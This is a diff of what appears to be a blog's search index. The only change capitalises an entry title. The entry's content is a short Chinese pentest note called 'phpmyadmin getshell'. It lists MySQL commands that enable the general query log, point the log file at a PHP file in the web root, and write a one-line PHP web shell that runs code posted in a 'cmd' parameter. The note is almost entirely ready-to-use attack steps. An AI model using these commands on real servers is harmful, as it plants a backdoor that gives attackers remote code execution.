@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[phpmyadmin getshell]]></title>
+    <title><![CDATA[Phpmyadmin getshell]]></title>
     <url>%2Farchives%2F694daf10.html</url>
     <content type="text"><![CDATA[查看是否有写文件权限show global variables like &apos;%secure%&apos;;查看日志文件存放路径及开启SHOW GLOBAL VARIABLES LIKE &apos;%general_log%&apos; set global general_log = ONgetshell 三大命令:set global general_log=&apos;on&apos;; SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;; //绝对路径 SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;;]]></content>
   </entry>
